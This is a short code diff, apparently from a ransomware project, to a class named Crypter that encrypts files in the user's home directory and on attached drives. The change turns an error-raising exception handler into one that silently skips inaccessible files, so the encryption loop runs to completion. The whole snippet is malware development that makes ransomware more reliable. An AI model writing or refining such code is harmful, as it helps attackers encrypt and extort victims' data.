@@ -306,7 +306,7 @@ class Crypter(Base.Base):
                     encrypted_files.append(file)
             except:
                 # Ignore any exception, such as access denied, and continue
-                raise
+                pass
 
         # Write out list of encrypted files
         if encrypted_files or (not self.__config["encrypt_user_home"] and not self.__config["encrypt_attached_drives"]):
